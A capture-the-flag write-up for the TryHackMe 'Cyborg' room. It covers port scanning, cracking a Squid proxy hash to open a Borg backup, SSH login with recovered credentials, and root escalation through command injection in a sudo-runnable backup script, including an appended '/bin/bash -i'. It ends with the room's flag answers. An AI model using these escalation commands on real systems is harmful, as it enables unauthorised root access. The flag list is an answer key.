# Write Up for Try Hack Me box - [Cyborg](https://tryhackme.com/room/cyborgt8)

This box is teaches you basics about a Unix Backup Solutions such as Borg.\
The PrivEsc is interesting as it touches you code analysis skills.

> Pratyush Prakhar (5#1NC#4N) - 10/31/2023

## RECONNAISSANCE

1. [All Port Scan](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/rustscan/all.nmap) with rustscan. 

**Results**

```bash
$ nmap -vvv -p 22,80 -oN rustscan/all.nmap 10.10.84.246
Nmap scan report for 10.10.84.246
Host is up, received conn-refused (0.16s latency).
Scanned at 2023-11-05 02:03:06 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Nov  5 02:03:06 2023 -- 1 IP address (1 host up) scanned in 0.41 seconds
```
2. Let's scan the open ports with a [basic scripts and version scan](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/rustscan/main.nmap).

**Results**

```bash
$ nmap -vvv -p 80,22 -sC -sV -oN rustscan/main.nmap 10.10.84.246
Nmap scan report for 10.10.84.246
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-11-05 02:04:34 IST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  5 02:04:47 2023 -- 1 IP address (1 host up) scanned in 12.70 seconds
```

2. There are **2 TCP** ports open. 
	1. *Port 22* - SSH - **OpenSSH 7.2p2**
	2. *Port 80* - HTTP - **Apache httpd 2.4.18**

3. Let's actively enumerate them all.


## SSH

1. OpenSSH installed. Will require a set of login credentials to get access through this path.
2. We can keep this for later.

**Results**
```bash
$ ssh 10.10.84.246                    
The authenticity of host '10.10.84.246 (10.10.84.246)' can't be established.
ED25519 key fingerprint is SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.84.246' (ED25519) to the list of known hosts.
kali@10.10.84.246's password: 
kali@10.10.84.246: Permission denied (publickey,password).
```

## WEB

1. Let's first check out the web server on port 80. 
	1. We get the `default Apache` page. --> No out going links.
   2. Let's check for the low hanging fruits such as robots.txt, backend language processor, and basic login and admin pages. --> `/admin page obtained`.
   3. Basic Nikto Scan yields following [results](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/nikto.txt).
	2. We can run sub domain check on this port using `feroxbuster`. Results [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/ferox.txt).
\
![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/images/web.png)
\
2. From both scans we get following interesting sub directories --> `/admin` and `/etc/squid`
   1. On the admin page, we get a `admin.html` page talking about [Squid Proxy](http://www.squid-cache.org/) and how the user has stored a backup archive names `music_archive.`
   \
   ![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/images/squid_proxy.png)
   \
   2. Also, we obtain a `archive.tar` [file](web/Archive/archive.tar) from the same page which can uncompressed to a [Borg Repository](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Archive/home/field/dev/final_archive/README).
   \
   ![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/images/admin.png)
   \
   3. On [research](https://www.liquidweb.com/kb/install-squid-proxy-server-ubuntu-16-04/) and through the above results, we find squid proxy to be installed at `/etc/squid` and we obtain the [following files](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Squid-proxy).
   \
   ![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/images/sp_config.png)
   \
3. Now that we have enough information to go on, let's first look into the [Borg Repository](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Archive/home) so obtained. [BorgBackup](https://www.borgbackup.org/) (short: Borg) is a deduplicating backup program. Optionally, it supports compression and authenticated encryption.
The main goal of Borg is to provide an efficient and secure way to backup data. The data deduplication technique used makes Borg suitable for daily backups since only changes are stored. Let's use this binary to extract backed up information from this repository.
   1. We can use the `info` subcommand on the `final_archive`. But we see that it needs a passphrase. This points us towards the [passwd](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Squid-proxy/passwd) file obtained earlier. Let's employ hashcat to obtain the cracked secret as [cracked file](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Squid-proxy/passwd.cracked). Supply this to the borg command and we get in !!!
   
   ```bash
   $ borg info home/field/dev/final_archive
   Enter passphrase for key /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive:
   Repository ID: ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
   Location: /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive
   Encrypted: Yes (repokey BLAKE2b)
   Cache: /home/kali/.cache/borg/ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
   Security dir: /home/kali/.config/borg/security/ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
   ------------------------------------------------------------------------------
                     Original size      Compressed size    Deduplicated size
   All archives:                1.49 MB              1.49 MB              1.50 MB

                     Unique chunks         Total chunks
   Chunk index:                      99                   99                                                            
   ```
   2. Now as we have tested our path entry point, let's enumerate the repo with `list` command followed by extraction of the found.
   ```bash
   $ borg list home/field/dev/final_archive/
   Enter passphrase for key /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive: 
   music_archive                        Tue, 2020-12-29 19:30:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
                                                                                                                                 
   $ borg extract home/field/dev/final_archive/::music_archive
   Enter passphrase for key /home/kali/Desktop/Boxes/Try_Hack_Me/In Progress/Easy/Cyborg/web/Archive/home/field/dev/final_archive: 
   ```
   3. We see that a hidden `home dir` appear on extraction. This belongs to the user [alex](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Archive/home/alex). On exploring, we find that there is `note.txt` providing us with some legit **[creds](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/web/Archive/home/alex/Documents/note.txt)**. Now let's use this to do some damage from inside the system.


## INITIAL ACCESS

1. Using the creds found, we get on the system as user alex. We can now easily obtain the `user.txt` in his home dir.

```bash
$ ssh alex@10.10.159.1
alex@10.10.159.1's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.

Last login: Sun Nov  5 05:29:49 2023 from 10.17.88.193
alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{*****************************************}
```

2. Now let's work for paths to elevate our privileges. We can do some manual testing and also run linpeas.
   1. Manual --> `sudo -l` --> Points us to `/etc/mp3backups/backup.sh` --> can be run as sudo.
   2. Linpeas results --> [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/ssh/tmp/linout_alex.txt)

3. On understanding the [backup.sh file](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Cyborg/ssh/etc/mp3backups/backup.sh), we see that it is owned totally by us and is picking up some mp3 files and is creating a tar backup. But there are two interesting pieces of code in it.
   1. First part allows a `arg` to be passed to the script in form of `-c <arg>` and this is stored as *command* var.
   2. Then the script runs this as `echo $<command>`. Thus, as this is run with sudo permissions, we can run any command if passed as arg. We have a command injection vulnerability here. We can exploit this.

```bash
.................................................
while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done
.............................................

cmd=$($command)
echo $cmd
```

## PRIVESC

1. There are multiple ways to exploit the above path to get root. Let's discuss a few.
   1. Intended ones.
      1. Pass the `root.txt` file to be read with sudo permissions as `-c` argument. This is the easiest path and shows your *static code analysis* skills.

      ```bash
      $ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
      /home/alex/Music/image12.mp3
      /home/alex/Music/image7.mp3
      /home/alex/Music/image1.mp3
      /home/alex/Music/image10.mp3
      /home/alex/Music/image5.mp3
      /home/alex/Music/image4.mp3
      /home/alex/Music/image3.mp3
      /home/alex/Music/image6.mp3
      /home/alex/Music/image8.mp3
      /home/alex/Music/image9.mp3
      /home/alex/Music/image11.mp3
      /home/alex/Music/image2.mp3
      find: ‘/run/user/108/gvfs’: Permission denied
      Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

      tar: Removing leading `/' from member names
      tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
      tar: Exiting with failure status due to previous errors

      Backup finished
      flag{*******************************************************}
      ```
   2. Unintended ways - Tasty Treats
      1. Edit the file by adding the `write permissions`. Now we can either directly run commands or call out a reverse shell to our box.
      
      ```bash
      alex@ubuntu:/etc/mp3backups$ ls -la
      total 24
      drwxr-xr-x   2 root root  4096 Dec 30  2020 .
      drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
      -rw-r--r--   1 root root     0 Nov  5 05:53 backed_up_files.txt
      -r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
      -rw-r--r--   1 root root    45 Nov  5 05:52 ubuntu-scheduled.tgz
      alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh 
      alex@ubuntu:/etc/mp3backups$ echo "/bin/bash -i" >> backup.sh 
      alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
      /home/alex/Music/image12.mp3
      /home/alex/Music/image7.mp3
      /home/alex/Music/image1.mp3
      /home/alex/Music/image10.mp3
      /home/alex/Music/image5.mp3
      /home/alex/Music/image4.mp3
      /home/alex/Music/image3.mp3
      /home/alex/Music/image6.mp3
      /home/alex/Music/image8.mp3
      /home/alex/Music/image9.mp3
      /home/alex/Music/image11.mp3
      /home/alex/Music/image2.mp3
      find: ‘/run/user/108/gvfs’: Permission denied
      Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

      tar: Removing leading `/' from member names
      tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
      tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
      tar: Exiting with failure status due to previous errors

      Backup finished

      root@ubuntu:/etc/mp3backups# whoami
      root
      root@ubuntu:~# id
      uid=0(root) gid=0(root) groups=0(root)
      ```

      2. Create a new file at the same location and run our malicious commands.

      3. Now that you are root, you know what else you can do. Have a Blast. 

## Answers to complete the box
	
1. Scan the machine, how many ports are open? - **2**

2. What service is running on port 22? - **SSH**

3. What service is running on port 80? - **HTTP**

4. What is the user.txt flag? - **flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}**

5. What is the root.txt flag? - **flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}**


**Stay Tuned On**\
[Github](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)